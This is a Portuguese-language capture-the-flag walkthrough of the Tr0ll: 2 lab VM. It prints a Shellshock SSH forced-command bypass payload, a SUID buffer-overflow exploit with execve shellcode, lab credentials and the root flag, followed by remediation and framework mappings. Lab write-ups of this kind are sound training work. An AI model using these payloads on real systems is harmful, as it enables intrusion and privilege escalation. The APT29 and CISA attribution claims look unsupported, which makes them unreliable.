# Tr0ll: 2 — Shellshock, Esteganografia e Uma Porta Que te Reinicia

( ͡° ͜ʖ ͡°) Boa rapaziada!! Tr0ll 2 aumenta a dificuldade e o trolling ao mesmo tempo. Três portas, apenas uma leva em frente: as erradas te bloqueiam por dois minutos ou reiniciam a VM inteira. Caótico de verdade. A cadeia de ataque combina acesso FTP com credenciais, esteganografia escondida em comentário JPEG, decodificação base64, Shellshock (CVE-2014-6271) via bypass de restrição SSH `command=`, e o mesmo estouro de pilha SUID 32-bit do Tr0ll 1. O detalhe: os binários embaralham a cada reinicialização. Sempre identifique pelo tamanho do arquivo, nunca pelo número da porta. Respeito ao maleus por camadas de complexidade perfeitas.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante/Intermediário |
| **VM Alvo** | Tr0ll: 2 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-2,107/ |
| **Técnicas** | Enumeração de serviços Nmap, acesso FTP com credenciais, esteganografia HTTP (comentário JPEG), decodificação base64, extração de chave RSA de ZIP, bypass Shellshock CVE-2014-6271 no SSH, descoberta de binário SUID, estouro de pilha 32-bit, injeção de shellcode |
| **CVEs** | CVE-2014-6271 (Shellshock: execução de definição de função bash em variáveis de ambiente), CWE-121 (Estouro de Pilha em binário SUID), CWE-312 (Armazenamento de credencial em texto claro) |
| **Grupos APT** | APT29 (Cozy Bear): explorou Shellshock em cenários de bypass de comando forçado SSH direcionados; APT28: usa esteganografia para embutir informações em campanhas de phishing e entrega de arquivos |

---

## Resumo do Ataque

```
nmap → FTP (21), SSH (22), HTTP (80)
  → FTP Tr0ll:Tr0ll → lmao.zip (protegido por senha)
  → HTTP robots.txt → 20+ caminhos proibidos (maioria são ciladas)
  → /dont_bother/cat_the_troll.jpg → tail/strings → "Look Deep within y0ur_self"
  → HTTP /y0ur_self/answer.txt → decodificação base64 → linha com comprimento 30
  → Senha ZIP: ItCantReallyBeThisEasyRightLOL → chave RSA noob
  → SSH -i noob noob@alvo → "TRY HARDER LOL!" (comando forçado)
  → Shellshock: ssh -t "() { :; }; /bin/bash" → uid=1002(noob)
  → /nothing_to_see_here/choose_wisely/door{1,2,3}/r00t
  → identificar binário BOF pelo tamanho 8401 bytes
  → GDB: offset 268 → sobrescrita do EIP
  → shellcode em NOP sled → uid=0(root)
  → cat /root/Proof.txt → a70354f0258dcc00292c72aab3c8b1e4
```

---

## Metodologia

1. Varredura completa de portas para identificar FTP, SSH, HTTP
2. Login FTP com credenciais não anônimas (encontradas via enumeração web)
3. Esteganografia HTTP: comentário JPEG revela caminho oculto
4. Decodificação base64 para extrair senha do ZIP
5. Extração do ZIP produz chave privada RSA para SSH
6. Bypass Shellshock da restrição de comando forçado SSH
7. Seleção de porta: identificar binário BOF real pelo tamanho do arquivo
8. Análise de offset com GDB e exploração do buffer overflow
9. Captura da flag de root

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
nmap -sn 192.168.56.0/24
# Alvo: 192.168.56.106

nmap -sV -A -p 21,22,80 192.168.56.106
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4
80/tcp open  http    Apache httpd 2.2.22
```

OpenSSH 5.9p1 no Debian: antigo o suficiente para as condições do Shellshock se aplicarem. vsftpd 2.0.8 é mais antigo que o 3.0.2 do Tr0ll 1, sugerindo credenciais não anônimas desta vez.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração HTTP: Encontrando o Caminho com Esteganografia

```bash
curl -s http://192.168.56.106/robots.txt
```

`robots.txt` proíbe 20+ caminhos, clássico misdirecionamento troll. Verifique alguns mas não persiga todos. Achado principal: `/dont_bother/` contém um arquivo JPEG:

```bash
wget http://192.168.56.106/dont_bother/cat_the_troll.jpg

# Verificar dados anexados
tail -c 200 cat_the_troll.jpg
# → "Look Deep within y0ur_self for the answer"

strings cat_the_troll.jpg | tail -5
# → mesma dica
```

A dica aponta diretamente para o caminho `/y0ur_self/`:

```bash
wget http://192.168.56.106/y0ur_self/answer.txt
```

**Nota sobre o mundo real:** Esconder dados em comentários JPEG e bytes anexados é uma técnica clássica de esteganografia (adjacente a CWE-312). Em casos reais de inteligência de ameaças, o APT28 usou dados anexados em arquivos de imagem legítimos como canal oculto para entrega de configuração C2.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Login FTP e Recuperação do ZIP

Primeiro, determine as credenciais FTP. O nome da máquina entrega: Tr0ll:Tr0ll.

```bash
ftp 192.168.56.106
# Name: Tr0ll
# Password: Tr0ll

ftp> get lmao.zip
ftp> bye
```

O ZIP está protegido por senha. A senha vem do `answer.txt`.

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 4 — Decodificar Senha do ZIP via answer.txt

```bash
base64 -d answer.txt > decoded.txt
cat decoded.txt | awk 'length==30'
# → ItCantReallyBeThisEasyRightLOL
```

O conteúdo decodificado é um arquivo estilo lista de palavras. A senha é a linha com exatamente 30 caracteres. O nome é mais um troll: realmente é tão fácil assim.

```bash
unzip -P ItCantReallyBeThisEasyRightLOL lmao.zip
# → extrai: noob (chave privada RSA PEM)
chmod 600 noob
```

**MITRE ATT&CK:** T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos

---

## Passo 5 — Bypass Shellshock no SSH (CVE-2014-6271)

SSH normal com a chave bate numa restrição de comando forçado:

```bash
ssh -i noob noob@192.168.56.106
# → TRY HARDER LOL!
# (comando forçado em authorized_keys: command="echo TRY HARDER LOL!")
```

A entrada em `authorized_keys` tem `command="echo TRY HARDER LOL!"` anteposto à chave pública. Em versões de bash anteriores ao patch 4.3, definições de função passadas em variáveis de ambiente executam antes do comando forçado ser executado. Isso é Shellshock.

Bypass usando `-t` para passar uma definição de função bash como comando:

```bash
ssh -i noob \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    noob@192.168.56.106 \
    -t "() { :; }; /bin/bash"
```

Esperado:

```
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

**Nota sobre o mundo real:** CVE-2014-6271 (Shellshock) foi corrigido em setembro de 2014, mas permaneceu sem correção em milhões de sistemas por anos. O APT29 usou Shellshock em cenários de bypass SSH com `command=` em 2014-2015. O padrão de usar `command=` como única restrição, sem garantir que o shell subjacente esteja corrigido, é uma falha de segurança em camadas que o Shellshock expôs globalmente.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 6 — Seleção de Porta: Identificar o Binário BOF Real

```bash
ls -la /nothing_to_see_here/choose_wisely/
# door1/  door2/  door3/

# As duas portas erradas:
# - Uma remove permissões por 2 minutos
# - Uma reinicia a VM
# Sempre identifique pelo tamanho do arquivo: o binário BOF tem exatamente 8401 bytes

ls -la /nothing_to_see_here/choose_wisely/door*/r00t
# Encontre qual porta contém o binário de 8401 bytes
# Exemplo: door2/r00t tem 8401 bytes, esse é o alvo
```

Atenção: os binários mudam de posição a cada reinicialização. Nunca fixe o número da porta no código. Sempre verifique o tamanho do arquivo.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1548.001 — Setuid e Setgid

---

## Passo 7 — Buffer Overflow: Encontrar Offset do EIP

```bash
gdb -q /nothing_to_see_here/choose_wisely/door2/r00t

(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()   ← EIP = BBBB
# Offset = 268 bytes (mesmo que Tr0ll 1)
```

Encontre ESP para endereço de retorno:

```bash
(gdb) x $esp
# 0xbffffb50: 0x43434343
# Real (fora do GDB): ~0xbffffb90 (ajuste +0x40 para overhead de ambiente)
```

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 8 — Exploit de Buffer Overflow

Shellcode Linux x86 `execve("/bin/sh")` (19 bytes):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Execute a partir do shell Shellshock, dentro do diretório correto:

```bash
DOOR=/nothing_to_see_here/choose_wisely/door2
cd $DOOR
./r00t $(python -c \
  'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + \
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

```
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# whoami
root
```

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 9 — Flag de Root

```bash
cat /root/Proof.txt
```

```
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

(☞ﾟヮﾟ)☞ Root. Caramba mano, mandou demais!

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial FTP | `Tr0ll:Tr0ll` | Dica no nome da máquina | Login FTP, download do ZIP |
| Senha ZIP | `ItCantReallyBeThisEasyRightLOL` | Decodificação base64 de /y0ur_self/answer.txt | Descompactar chave RSA noob |
| Chave RSA | noob (chave privada PEM) | lmao.zip via FTP | Autenticação SSH |
| Shellshock | `() { :; }; /bin/bash` | CVE-2014-6271 | Bypass restrição SSH command= |
| Flag root | `a70354f0258dcc00292c72aab3c8b1e4` | /root/Proof.txt | Conclusão do desafio |
| Offset BOF | 268 bytes até o EIP | Análise com GDB | Construção do exploit |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Shellshock (CVE-2014-6271) bypassa restrição command= | Milhões de sistemas eram vulneráveis; APT29 explorou esse padrão em 2014-2015 para bypass SSH | Corrija bash para versão 4.3+; command= não é fronteira de segurança sem shell corrigido |
| 2 | Esteganografia em dados anexados de JPEG | APT28 usa dados anexados a imagens para entrega de configuração C2 oculta | Inspecione arquivos de imagem com exiftool e strings; escaneie anomalias de dados anexados |
| 3 | Lista de palavras codificada em base64 como portadora de senha | Codificação não é criptografia: base64 é trivialmente decodificado por qualquer atacante | Nunca use codificação como controle de segurança; use criptografia com gerenciamento adequado de chaves |
| 4 | SUID BOF com mecânica de portas embaralhadas | Embaralhamento de binários força identificação baseada em tamanho; auditorias reais de SUID usam hash, não nomes | Sempre identifique binários SUID por hash e tamanho; automatize auditorias com tripwire/AIDE |
| 5 | Chave privada RSA em ZIP acessível via FTP | Autenticação SSH por chave é tão forte quanto a proteção da chave privada em si | Nunca distribua chaves privadas via FTP; use canais seguros para distribuição de chaves |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrija bash contra Shellshock**: atualize para bash 4.3+ com os patches Shellshock aplicados; `command=` em authorized_keys não é fronteira de segurança em bash não corrigido
2. **Nunca distribua chaves privadas RSA via FTP**: use canais seguros e autenticados para distribuição de chaves; considere SSH baseado em certificados
3. **Remova credenciais FTP correspondentes ao nome da VM**: aplique políticas de senha; Tr0ll:Tr0ll é uma credencial padrão
4. **Compile binários SUID com mitigações completas**: `-fstack-protector-all`, PIE, pilha NX
5. **Habilite ASLR em todo o sistema**: `echo 2 > /proc/sys/kernel/randomize_va_space`
6. **Audite todos os binários SUID por hash e tamanho**: use AIDE ou tripwire para monitoramento de integridade

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todas as configurações SSH; audite contagem de binários SUID |
| Proteger | Controle de Acesso | Corrija bash; remova credenciais FTP padrão; use SSH com certificado |
| Proteger | Segurança de Dados | Sem chaves privadas em FTP; sem senhas codificadas em base64 na raiz web |
| Detectar | Anomalias e Eventos | Alerte em conexões SSH com padrão Shellshock; monitoramento de execução SUID |
| Responder | Planejamento de Resposta | Rotacione todas as chaves expostas; corrija bash imediatamente |
| Recuperar | Planejamento de Recuperação | Reconstrua host comprometido; reemita todas as chaves SSH |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrinja FTP apenas a usuários autenticados |
| AC-6 | Menor Privilégio | Remova SUID de binários não essenciais |
| CM-7 | Funcionalidade Mínima | Corrija bash; desative FTP ou exija autenticação |
| IA-5 | Gerenciamento de Autenticador | Rotacione chaves RSA; aplique senhas FTP fortes |
| SI-2 | Correção de Falhas | Corrija CVE-2014-6271 (Shellshock) imediatamente |
| SI-16 | Proteção de Memória | Habilite ASLR, NX; compile com protetor de pilha |

### CISA KEV

CVE-2014-6271 (Shellshock) está catalogado no catálogo de Vulnerabilidades Conhecidas Exploradas da CISA. A CISA exige correção para todas as agências federais e recomenda fortemente correção imediata para todas as organizações. O padrão de restrição `command=` sem bash corrigido pelo Shellshock é explicitamente apontado como mitigação insuficiente.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (corrigir bash; desativar acesso FTP anônimo)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (ASLR, NX, canário de pilha; auditoria SUID)
- **D3-UA** — Gerenciamento de Conta de Usuário (remover credenciais FTP padrão; reemitir chaves SSH)

---

## Considerações Finais

Tr0ll: 2 é uma aula magistral de misdirecionamento em camadas com profundidade real de vulnerabilidade. O bypass Shellshock é o destaque: ensina um princípio fundamental de que `command=` em authorized_keys não faz sandbox do próprio shell, apenas controla o que é executado após a inicialização do shell. Se o shell é vulnerável, a restrição não vale nada. Essa é uma lição do mundo real que se aplica a dezenas de configurações SSH em produção hoje.

A mecânica das portas é frustrante da melhor forma possível. Ser reiniciado pelo seu próprio exploit é uma experiência humilhante que ensina a ler antes de clicar. Identificação por tamanho de arquivo é a habilidade real sendo treinada aqui. Passeio selvagem, véi! ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
